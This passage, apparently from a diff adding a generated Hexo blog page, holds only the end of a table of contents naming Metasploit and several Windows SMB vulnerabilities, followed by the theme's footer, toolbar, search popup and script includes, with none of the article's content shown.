class="nav-text">Metasploit</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#MS17-010-Eternal-Blue"><span class="nav-text">MS17-010 | Eternal Blue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MS08-067"><span class="nav-text">MS08-067</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#cve-2009-3103"><span class="nav-text">cve 2009-3103</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Enlaces-de-interes"><span class="nav-text">Enlaces de interés</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sergiky</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">IMPULSADO POR <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">TEMA&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+                
+                
+
+                <li class="right-bottom-tools page-aside-toggle ">
+                        <i class="fa-regular fa-outdent"></i>
+                </li>
+
+                
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Buscar..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
